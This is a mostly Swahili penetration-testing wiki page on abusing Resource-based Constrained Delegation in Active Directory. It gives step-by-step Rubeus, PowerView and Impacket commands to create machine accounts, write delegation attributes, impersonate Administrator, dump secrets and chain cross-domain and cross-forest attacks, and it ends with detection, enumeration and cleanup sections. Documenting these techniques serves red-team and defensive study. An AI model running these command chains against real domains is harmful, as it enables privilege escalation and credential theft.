# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

Hii ni sawa na [Constrained Delegation](constrained-delegation.md) ya msingi, lakini **badala ya** kutoa ruhusa kwa **object** ili **ku-impersonate user yeyote dhidi ya machine**, Resource-based Constrain Delegation **huweka** kwenye **object** taarifa ya anayeweza ku-impersonate user yeyote dhidi yake.<sup>[[12]](#references)</sup>

Katika hali hii, object iliyowekewa delegation itakuwa na attribute inayoitwa _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ yenye jina la user anayeweza ku-impersonate user mwingine yeyote dhidi yake.

Tofauti nyingine muhimu kati ya Constrained Delegation hii na delegations nyingine ni kwamba user yeyote mwenye **write permissions juu ya machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) anaweza kuweka **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Katika aina nyingine za Delegation ulihitaji privs za domain admin).<sup>[[1]](#references)</sup>

### New Concepts

Katika Constrained Delegation, ilielezwa kwamba flag ya **`TrustedToAuthForDelegation`** iliyo ndani ya value ya _userAccountControl_ ya user inahitajika kutekeleza **S4U2Self.** Lakini hilo si kweli kabisa.\
Ukweli ni kwamba hata bila value hiyo, unaweza kutekeleza **S4U2Self** dhidi ya user yeyote ikiwa wewe ni **service** (una SPN), lakini ikiwa **una `TrustedToAuthForDelegation`**, TGS itakayoletwa itakuwa **Forwardable**, na ikiwa **huna** flag hiyo, TGS itakayoletwa **haitakuwa** **Forwardable**.<sup>[[5]](#references)</sup>

Hata hivyo, ikiwa **TGS** inayotumika katika **S4U2Proxy** **SI Forwardable**, kujaribu kutumia vibaya **basic Constrain Delegation** **hakutafanya kazi**. Lakini ikiwa unajaribu kutumia Resource-Based constrain delegation, itafanya kazi.<sup>[[1]](#references)[[2]](#references)</sup>

### Attack structure

> Ikiwa una **write equivalent privileges** juu ya account ya **Computer**, unaweza kupata **privileged access** kwenye machine hiyo.

Tuseme kwamba attacker tayari ana **write equivalent privileges juu ya victim computer**.

1. Attacker **hu-compromise** account yenye **SPN** au **huunda moja** (“Service A”). Kumbuka kwamba _Admin User_ yeyote bila privilege nyingine maalum anaweza **kuunda** hadi Computer objects 10 (**_MachineAccountQuota_**) na kuziweka **SPN**. Kwa hiyo attacker anaweza tu kuunda Computer object na kuiwekea SPN.
2. Attacker **hutumia vibaya WRITE privilege yake** juu ya victim computer (ServiceB) ili kusanidi **resource-based constrained delegation kumruhusu ServiceA ku-impersonate user yeyote** dhidi ya victim computer huyo (ServiceB).
3. Attacker hutumia Rubeus kutekeleza **full S4U attack** (S4U2Self na S4U2Proxy) kutoka Service A hadi Service B kwa ajili ya user **mwenye privileged access kwa Service B**.
1. S4U2Self (kutoka kwenye account iliyo-compromised/iliyoundwa yenye SPN): Omba **TGS ya Administrator kwenda kwangu** (Not Forwardable).
2. S4U2Proxy: Tumia **TGS isiyo Forwardable** ya hatua iliyotangulia kuomba **TGS** kutoka kwa **Administrator** kwenda kwa **victim host**.
3. Hata kama unatumia TGS isiyo Forwardable, kwa kuwa unatumia resource-based constrained delegation, itafanya kazi.
4. Attacker anaweza **pass-the-ticket** na **ku-impersonate** user ili kupata **access kwa victim ServiceB**.<sup>[[1]](#references)</sup>

Kuangalia _**MachineAccountQuota**_ ya domain unaweza kutumia:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Shambulio

### Kuunda Kitu cha Kompyuta

Unaweza kuunda computer object ndani ya domain ukitumia **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Kusanidi Resource-based Constrained Delegation

**Kwa kutumia activedirectory PowerShell module**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Kwa kutumia powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Kufanya shambulizi kamili la S4U (Windows/Rubeus)

Kwanza kabisa, tuliunda Computer object mpya kwa kutumia password `123456`, kwa hiyo tunahitaji hash ya password hiyo:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Hii itaonyesha hash za RC4 na AES za account hiyo.\
Sasa, attack inaweza kufanywa:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Unaweza kuzalisha tiketi zaidi za services zaidi kwa kuuliza mara moja tu ukitumia param ya `/altservice` ya Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Kumbuka kuwa users wana attribute inayoitwa "**Cannot be delegated**". Ikiwa user ana attribute hii ikiwa True, hutaweza ku-impersonate. Property hii inaweza kuonekana ndani ya bloodhound.

### Zana za Linux: RBCD ya mwisho hadi mwisho kwa kutumia Impacket (2024+)

Ikiwa unafanya kazi kutoka Linux, unaweza kutekeleza mnyororo kamili wa RBCD kwa kutumia zana rasmi za Impacket:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- If LDAP signing/LDAPS is enforced, use `impacket-rbcd -use-ldaps ...`.
- Prefer AES keys; many modern domains restrict RC4. Impacket and Rubeus both support AES-only flows.
- Impacket can rewrite the `sname` ("AnySPN") for some tools, but obtain the correct SPN whenever possible (e.g., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Cross-domain & cross-forest RBCD

If the **delegating principal** you control lives in a **different domain** (or even a **different forest**) than the **resource computer**, the abuse is still **RBCD**, but the ticket flow is no longer the usual single-domain `S4U2Self -> S4U2Proxy`.

### Cross-domain RBCD: configure the foreign principal by SID

When you set `msDS-AllowedToActOnBehalfOfOtherIdentity` from a **different domain**, the foreign machine/user might **not be resolvable by name** in the target domain LDAP. In that case, configure the delegation entry using the **SID** of the foreign principal instead of its sAMAccountName/UPN.

This is especially relevant when relaying NTLM to LDAP with `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes:
- `--sid` huiambia `ntlmrelayx.py` ishughulikie `--escalate-user` kama SID, jambo linalohitajika wakati delegating account ni ya nje ya target domain.
- Hata kama tool itaonyesha `User not found in LDAP`, delegation write bado inaweza kufanikiwa kwa sababu security descriptor huhifadhi foreign SID moja kwa moja.

### Cross-domain RBCD: cross-realm S4U sequence

Mara tu foreign principal inapokuwa ndani ya `msDS-AllowedToActOnBehalfOfOtherIdentity`, mtiririko unaofanya kazi wa cross-domain ni:<sup>[[9]](#references)[[13]](#references)</sup>

1. Pata **TGT** ya delegating principal kutoka kwenye domain yake.
2. Omba **referral TGT** ya `krbtgt/<target-domain>`.
3. Omba **cross-realm S4U2Self referral** ya impersonated user kwenye target-domain DC.
4. Omba ticket halisi ya **S4U2Self** ya user huyo, ukirudi kwenye delegator domain.
5. Fanya **S4U2Proxy** kwenye delegator domain ili kupata referral ticket ya target domain.
6. Fanya **S4U2Proxy** ya mwisho kwenye target-domain DC ili kupata service ticket ya `cifs/host.target`, `host/host.target`, n.k.

Hii ndiyo sababu stock Linux tooling mara nyingi hushindwa kwenye cross-domain RBCD:<sup>[[9]](#references)</sup>
- **realm** ya request inaweza kuhitaji kutofautiana na realm ya TGT iliyotumika kwenye `TGS-REQ`
- chain inahitaji hatua **huru za S4U2Proxy**, si **S4U2Self** pekee au **S4U2Self** ikifuatiwa mara moja na **S4U2Proxy** moja

### Cross-domain RBCD from Linux

Synacktiv ilichapisha implementation ya Impacket `getST.py` inayorudia cross-realm sequence kutoka Linux kwa kushughulikia KDC mbili moja kwa moja:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Kwa matumizi, arguments mpya ni:
- `-dc-ip`: DC ya domain inayokabidhi
- `-targetdomain`: domain ya resource computer
- `-targetdc`: DC ya resource domain

### Vikwazo vya Cross-forest RBCD

Cross-forest RBCD ina kikwazo muhimu: **mtumiaji anayeigizwa lazima awe wa forest sawa na delegating principal**. Kwa maneno mengine, ikiwa machine account unayoidhibiti iko katika `valhalla.local` na resource inayolengwa iko katika `asgard.local`, kwa kawaida **huwezi ku-impersonate watumiaji kiholela wa `asgard.local`** kwa resource hiyo kupitia RBCD.<sup>[[9]](#references)</sup>

Bado inaweza kutumika wakati:
- mtumiaji wa **delegating forest** ni **local admin** (au ana privileged nyingine) kwenye resource host iliyo katika forest nyingine
- trust inaruhusu authentication path inayohitajika na foreign SID inakubaliwa katika security descriptor ya target computer

### Quirks za Cross-forest RBCD protocol

Cross-forest RBCD si "cross-domain pamoja na trust" tu. Flow iliyozingatiwa ina quirks mbili ambazo tooling ya kawaida kihistoria huzikosa:<sup>[[9]](#references)</sup>

1. Ombi la ziada la **S4U2Proxy** linaloweka **`PA-PAC-OPTIONS=branch-aware`**
2. Service ticket ya mwisho ambayo inaweza kurejeshwa kwa kutumia **RC4** hata wakati etypes nyingine ziliombwa

Flow ya kivitendo ni:

1. Pata TGT ya delegating principal katika forest A.
2. Omba **S4U2Self** ya mtumiaji anayeigizwa katika forest A.
3. Omba **S4U2Proxy** katika forest A ili kupata referral TGT ya forest B.
4. Tuma **S4U2Proxy** ya pili katika forest A **bila S4U2Self ticket kama additional ticket**, lakini ukiwa umewezesha `branch-aware`, ili kupata referral TGT nyingine ya forest B.
5. Kwa hiari, omba service ticket ya kawaida katika forest B ya delegating principal (ticket hii haihitajiki kwa abuse ya mwisho).
6. Tumia referral tickets kutoka hatua ya 3 na 4 kuomba ticket ya mwisho ya **S4U2Proxy** katika forest B, kwa mtumiaji wa forest A anayeigizwa, kuelekea target SPN.

### Cross-forest RBCD kutoka Linux

Branch hiyo hiyo ya Synacktiv Impacket inaongeza switch ya `-forest` kwa logic hii:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domains)

Katika **multi-domain forests**, **S4U2Self** na **S4U2Proxy** zinaweza kuwa **recursive** badala ya kusimama baada ya referral moja:

- **Recursive S4U2Self**: `S4U2Self` ya kwanza hutumwa kwenye **impersonated user's domain**, parent/child hops za kati hupitiwa kwa `TGS-REQ` referrals za kawaida za `krbtgt/<REALM>`, na **final `S4U2Self`** hutumwa kwenye **delegating principal's own domain**.
- Hii inamaanisha kuwa **kushikilia TGT** ya machine account pekee kunaweza kutosha ku-impersonate **admin kutoka domain nyingine iliyo kwenye forest hiyo hiyo** na ku-request `cifs/host`, `host/host`, `wsman/host`, n.k.
- **Recursive S4U2Proxy** hufuata trust chain kwa njia hiyo hiyo: intermediate hops hutumia tena ticket iliyotangulia kama TGT wakati wa ku-request `krbtgt/<REALM>` referral inayofuata, na hop ya mwisho pekee ndiyo hurejesha final service ticket.<sup>[[10]](#references)</sup>

Mfano wa vitendo wa same-forest ni:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

Ikiwa **delegating principal ni user asiye na SPN**, `S4U2Self` ya mwisho ya recursive hushindwa kwa **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Workaround ni **kujaribu tena hop ya mwisho pekee kama `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Muhtasari mfupi wa abuse chain:

1. Authenticate kwa kutumia **NT hash** ili KDC isukumwe kuelekea **RC4-HMAC (etype 23)**.
2. Omba **`-self -u2u`** kwanza na ihifadhi ticket hiyo kando na proxy step ya baadaye.
3. Extract **TGT session key** kwa kutumia `describeTicket.py`.
4. Badilisha **NT hash** ya user na **session key** hiyo kwa kutumia `changepasswd.py -newhashes <session_key>`.
5. Tumia tena ticket ya `S4U2Self+U2U` kama **`-additional-ticket`** wakati wa ombi tofauti la **`-proxy`**.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Tahadhari za uendeshaji:

- Wakati **hop ya kwanza inayoaminika tayari ni forest nyingine**, pendelea algorithm ya **branch-aware** (`getST.py ... -forest`) ili kuendana na tabia asili ya Windows. Ikiwa forest ya kigeni inafikiwa **baadaye** katika chain, mtiririko wa recursive usio wa branch-aware bado unaweza kufanya kazi.<sup>[[9]](#references)</sup>
- Kwenye DC za hivi karibuni za **Windows Server 2022/2025**, kulazimisha RC4 kunaweza kushindikana kwa **`KDC_ERR_ETYPE_NOSUPP`** kwa sababu ya kuondolewa kwa RC4; hali hii inaweza kufanya **SPN-less RBCD isiwezekane**, ingawa RBCD ya kawaida inayotegemea SPN bado hufanya kazi na AES.<sup>[[15]](#references)</sup>
- Tekeleza **`S4U2Self+U2U` kabla ya kubadilisha hash/password ya mtumiaji**: `SamrChangePasswordUser` **haihesabu upya** funguo za AES za Kerberos za account, hivyo kubadilisha password kwanza kunaweza kuvuruga maombi ya ticket yanayofuata.<sup>[[14]](#references)</sup>
- Account inayotumika kwa impersonation lazima bado iwe **delegable**: **Protected Users** na accounts zilizo na **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** huzuia chain.

## Maelezo ya Detection / hardening

- Njia za RBCD zinazovuka domains/forests bado kwa kawaida huundwa kupitia **ACL abuse** au **relay-to-LDAP**. Tekeleza **LDAP signing** na **LDAP channel binding** kwenye DCs ili kuvunja njia za kawaida za setup.
- Kagua ni nani anayeweza kuandika `msDS-AllowedToActOnBehalfOfOtherIdentity` kwenye computer objects na utambue SIDs zilizohifadhiwa, ikijumuisha **foreign security principals**.
- Katika mazingira yenye trust nyingi, kagua **Selective Authentication**, **SID filtering**, na ikiwa users kutoka forest ya kigeni wana haki za **local admin** kwenye resource hosts.

### Kufikia

Command line ya mwisho itatekeleza **S4U attack kamili na ku-inject TGS** kutoka kwa Administrator hadi kwenye victim host katika **memory**.\
Katika mfano huu, TGS ya service ya **CIFS** iliombwa kutoka kwa Administrator, hivyo utaweza kufikia **C$**:
```bash
ls \\victim.domain.local\C$
```
### Kutumia vibaya service tickets tofauti

Jifunze kuhusu [**service tickets zinazopatikana hapa**](silver-ticket.md#available-services).

## Kuhesabu, kukagua na kusafisha

### Kuhesabu kompyuta zilizo na RBCD iliyosanidiwa

PowerShell (kudecode SD ili kutatua SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (kusoma au kufuta kwa amri moja):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Usafishaji / kuweka upya RBCD

- PowerShell (futa attribute):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Makosa ya Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Hii inamaanisha kuwa kerberos imesanidiwa kutotumia DES au RC4 na unatoa hash ya RC4 pekee. Mpatia Rubeus angalau hash ya AES256 (au mpatia hash za rc4, aes128 na aes256). Mfano: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** wakati wa `-self` kwa user wa kawaida: principal anayefanya delegation huenda **hana SPN**. Jaribu tena **last hop** kama **`S4U2Self+U2U`** badala ya `S4U2Self` ya kawaida.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** wakati wa **SPN-less RBCD**: DC za hivi karibuni zinaweza kukataa njia ya **RC4-HMAC** inayolazimishwa na ujanja wa **`S4U2Self+U2U` + session-key-substitution**. Jaribu njia ya kawaida ya **SPN-backed** RBCD ukitumia AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Hii inamaanisha kuwa muda wa computer ya sasa unatofautiana na wa DC na kerberos haifanyi kazi ipasavyo.
- **`preauth_failed`**: Hii inamaanisha kuwa username + hashes zilizotolewa hazifanyi kazi ku-login. Huenda umesahau kuweka "$" ndani ya username wakati wa kutengeneza hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Hii inaweza kumaanisha:
- User unayejaribu ku-impersonate hawezi kufikia service inayotakiwa (kwa sababu huwezi kumu-impersonate au hana privileges za kutosha)
- Service iliyoombwa haipo (ukiomba ticket ya winrm lakini winrm haifanyi kazi)
- Fakecomputer iliyoundwa imepoteza privileges zake kwenye server iliyo katika hatari na unahitaji kuzirudisha.
- Unatumia classic KCD; kumbuka RBCD hufanya kazi na S4U2Self tickets zisizo-forwardable, huku KCD ikihitaji ziwe forwardable.

## Notes, relays and alternatives

- Unaweza pia kuandika RBCD SD kupitia AD Web Services (ADWS) ikiwa LDAP imechujwa. Tazama:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains mara nyingi huishia kwenye RBCD ili kupata local SYSTEM kwa hatua moja. Tazama mifano ya vitendo ya kutoka mwanzo hadi mwisho:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ikiwa LDAP signing/channel binding **imezimwa** na unaweza kuunda machine account, tools kama **KrbRelayUp** zinaweza ku-relay Kerberos auth iliyolazimishwa kwenda LDAP, kuweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kwa machine account yako kwenye target computer object, na mara moja ku-impersonate **Administrator** kupitia S4U ukiwa off-host.<sup>[[8]](#references)</sup>

## References

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Resource-Based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
